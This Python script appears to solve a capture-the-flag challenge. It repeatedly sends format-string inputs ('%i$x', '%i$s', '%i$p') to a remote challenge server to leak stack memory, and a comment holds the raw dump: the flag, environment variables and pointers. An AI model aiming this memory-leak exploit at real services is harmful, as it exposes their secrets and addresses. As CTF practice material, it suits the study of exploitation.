import socket

# An overengineered socket class for A Levels
class Connection:
    def __init__(self, ip, port, server=False):
        self.net = (ip, port)
        self.isServer = server
        if server == True:
            self.set_server()
        else:
            self.set_client()

    ### Important Initialisation steps ###############################
    def set_server(self):
        self.socket = socket.socket()
        self.socket.bind(self.net)
        self.socket.listen()
        print('Listening on',self.net)

        self.conn, self.conn_addr = self.socket.accept()
        print('Accepted connection from', self.conn_addr)
        self.socket.close()

    def set_client(self):
        #print("Connecting to",self.net)
        self.conn = socket.socket()
        self.conn.connect(self.net)
        #print("Connected")

    ### Basic I/O #####################################################
    def send(self, message):
        self.conn.sendall(message.encode('ascii') + b'\n') # \n be end char

    def receive(self):
        data = ""
        while '\n' not in data:
            data += self.conn.recv(1024).decode('ascii') # 1024 is max size
        return data.strip()

    def close(self):
        return self.conn.close()

    ### Unnecessary but useful ########################################
    def interactive(self):
        # Loop
        connected = True
        while connected:
            output = self.receive()
            if output == 'Exit':
                connected = False
            else:
                print(output)
                self.send(input())

        self.close()

def leak(i,mode='x'):
    client = Connection('shell.actf.co', 21820)
    client.receive()
    client.send(f"%{i}${mode}")
    data = client.receive().replace("Welcome,","")
    client.close()
    return data
s = []
c = []
d = []
x=[]
p = []
for i in range(1,100):
    print("###",i,"###############")
    try:
        p.append(leak(i,'p'))
        x.append(leak(i))
        s.append(leak(i,'s'))
        c.append(leak(i,'c'))
        d.append(leak(i,'d'))
    except:pass

print(x, c, s, d, p)

'''
[' 1cebb560', ' 0', ' 0', ' 9', ' 9', ' 1', ' 1d692a0', ' 73465443', ' 6e756620', ' 0', ' 0', ' 0', ' 0', ' 61700000', ' 32316472', ' 0', ' 0', ' 0', ' 0', ' 0', ' 30373931', ' 0', ' 0', ' 0', ' 0', ' 0', ' 35342d33', ' 3039', ' 0', ' 0', ' 0', ' 0', ' 66746361', ' 27695f6c', ' 695f6b63', ' 5f6b6361', ' 5f6d2769', ' 5f6e695f', ' 63617473', ' 35623963', ' 37646165', ' 35663161', ' 0', ' 0', ' 0', ' 0', ' 0', ' 0', ' 401420', ' 30352570', ' 6b293f00', ' 72b16430', ' 401419', ' 0', ' 713160b3', ' 7c48f620', ' 82db9d8', ' 0', ' 4013e3', ' 401420', ' d2dbe115', ' 4010b0', ' b093d900', ' 0', ' 0', ' 35d08e96', ' c88952af', ' 0', ' 0', ' 0', ' 1', ' e33ad128', ' 5b4b3eb8', ' c8971190', ' 0', ' 0', ' 4010b0', ' e015b060', ' 0', ' 0', ' 4010de', ' f6ee03b8', ' 1c', ' 1', ' 74d83ec3', ' 0', ' c206eec', ' 7175bf07', ' 2f31ff10', ' 847aef27', ' 63edff73', ' 1d48afa2', ' cc9f7faf', ' 0', ' 21', ' b2fd7000', ' 10', ' 178bfbff', ' 6']
[' p', ' \x00', ' \x00', '', '', ' \x02', ' C', '', ' \x00', ' \x00', ' \x00', ' \x00', ' \x00', ' r', ' \x00', ' \x00', ' \x00', ' \x00', ' \x00', ' 1', ' \x00', ' \x00', ' \x00', ' \x00', ' \x00', ' 3', ' 9', ' \x00', ' \x00', ' \x00', ' \x00', ' a', ' l', ' c', ' a', ' i', ' _', ' s', ' c', ' e', ' a', ' \x00', ' \x00', ' \x00', ' \x00', ' \x00', ' \x00', ' \x00', ' P', ' \x00', '', ' \x00', ' W', ' p', ' \x00', ' \x00', ' \x1a', ' \x00', ' \x00', ' \x00', ' \x01', ' \x00', ' \x00', ' \x10', ' \x00', ' \x00', '', ' \x01', ' \x00', ' \x07', ' \x10', " '", ' s', ' \x00', ' !', ' \x00', ' \x10', ' \x06'] [' ', ' (null)', ' (null)', ' Segmentation fault (core dumped)', ' Segmentation fault (core dumped)', ' (null)', ' Segmentation fault (core dumped)', ' Segmentation fault (core dumped)', ' (null)', ' (null)', ' (null)', ' (null)', ' Segmentation fault (core dumped)', ' Segmentation fault (core dumped)', ' (null)', ' (null)', ' (null)', ' (null)', ' Segmentation fault (core dumped)', ' Segmentation fault (core dumped)', ' (null)', ' (null)', ' (null)', ' (null)', ' Segmentation fault (core dumped)', ' Segmentation fault (core dumped)', ' Segmentation fault (core dumped)', ' (null)', ' (null)', ' (null)', ' (null)', ' Segmentation fault (core dumped)', ' Segmentation fault (core dumped)', ' Segmentation fault (core dumped)', ' Segmentation fault (core dumped)', ' Segmentation fault (core dumped)', ' Segmentation fault (core dumped)', ' Segmentation fault (core dumped)', ' Segmentation fault (core dumped)', ' Segmentation fault (core dumped)', ' Segmentation fault (core dumped)', ' (null)', ' (null)', ' (null)', ' (null)', ' (null)', ' (null)', ' Segmentation fault (core dumped)', ' Segmentation fault (core dumped)', '', ' (null)', '', ' Segmentation fault (core dumped)', ' Segmentation fault (core dumped)', ' \x01', ' (null)', ' (null)', ' Segmentation fault (core dumped)', ' Segmentation fault (core dumped)', ' (null)', ' (null)', ' (null)', ' Segmentation fault (core dumped)', '', ' (null)', ' (null)', ' \x01', ' (null)', ' (null)', '', ' Segmentation fault (core dumped)', ' Segmentation fault (core dumped)', ' /problems/2021/stickystacks/stickystacks', ' (null)', ' REMOTE_HOST=128.106.229.91', ' OLDPWD=/', ' JOURNAL_STREAM=9:19669', ' PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin', ' INVOCATION_ID=3ca843bfbeaf40c08d8d74eafcad6cf8', ' LANG=C.UTF-8', ' PWD=/problems/2021/stickystacks', ' (null)', ' Segmentation fault (core dumped)', ' \x7fELF\x02\x01\x01', ' Segmentation fault (core dumped)', ' Segmentation fault (core dumped)', ' Segmentation fault (core dumped)']
[' -125318464', ' 0', ' 0', ' 9', ' 9', ' 2', ' 1933988931', ' 1853187616', ' 0', ' 0', ' 0', ' 0', ' 1634729984', ' 842097778', ' 0', ' 0', ' 0', ' 0', ' 0', ' 808925489', ' 0', ' 0', ' 0', ' 0', ' 0', ' 892611891', ' 12345', ' 0', ' 0', ' 0', ' 0', ' 1718903649', ' 661217132', ' 1767861091', ' 1600873313', ' 1600989033', ' 1601071455', ' 1667331187', ' 895629667', ' 929325413', ' 895889761', ' 0', ' 0', ' 0', ' 0', ' 0', ' 0', ' 405644544', ' -1455754432', ' 0', ' -180849120', ' 0', ' 1432385556', ' 1112739728', ' 0', ' 0', ' 798625828', ' 0', ' 0', ' 0', ' 1', ' 0', ' 0', ' 2086984784', ' 0', ' 0', ' 28', ' 1', ' 0', ' -519839993', ' 396910352', ' -1434681561', ' -1582538893', ' 0', ' 33', ' -757350400', ' 16', ' 6']

[' 0x7fff12fdd720', ' (nil)', ' (nil)', ' 0x9', ' 0x9', ' 0x1', ' 0xab22a0', ' 0x6572612073465443', ' 0x216e756620', ' (nil)', ' (nil)', ' (nil)', ' (nil)', ' 0x6f77737361700000', ' 0x3332316472', ' (nil)', ' (nil)', ' (nil)', ' (nil)', ' 0x2f312f3100000000', ' 0x30373931', ' (nil)', ' (nil)', ' (nil)', ' (nil)', ' 0x3231000000000000', ' 0x38372d3635342d33', ' 0x3039', ' (nil)', ' (nil)', ' (nil)', ' (nil)', ' 0x6c65777b66746361', ' 0x61625f6d27695f6c', ' 0x6c625f6e695f6b63', ' 0x5f7365795f6b6361', ' 0x6b6361625f6d2769', ' 0x5f6568745f6e695f', ' 0x65625f6b63617473', ' 0x3439323135623963', ' 0x3438363737646165', ' 0xa7d333935663161', ' (nil)', ' (nil)', ' (nil)', ' (nil)', ' (nil)', ' (nil)', ' 0x401420', ' 0x7024303525a0', ' 0x45bb21a04da15000', ' 0x7fff847d4dc0', ' 0x401419', ' (nil)', ' 0x7f3f955770b3', ' 0x7f5530512620', ' 0x7ffd125a4b98', ' 0x100000000', ' 0x4013e3', ' 0x401420', ' 0xa50121fdb25e6809', ' 0x4010b0', ' 0x7ffc51d993f0', ' (nil)', ' (nil)', ' 0xb8e0b7ebbd6458eb', ' 0x829642051f6f68fd', ' (nil)', ' (nil)', ' (nil)', ' 0x1', ' 0x7ffdfbe521c8', ' 0x7ffe3c0bc498', ' 0x7f9769a77190', ' (nil)', ' (nil)', ' 0x4010b0', ' 0x7fffb0113430', ' (nil)', ' (nil)', ' 0x4010de', ' 0x7ffff683aff8', ' 0x1c', ' 0x1', ' 0x7fff79a43ec3', ' (nil)', ' 0x7fffab7f0eec', ' 0x7ffea328ff07', ' 0x7ffcf274cf10', ' 0x7fff507e7f27', ' 0x7ffc91a1ff73', ' 0x7ffd45e72fa2', ' 0x7ffdb6ef0faf', ' (nil)', ' 0x21', ' 0x7fff765dd000', ' 0x10', ' 0x178bfbff', ' 0x6']

'''
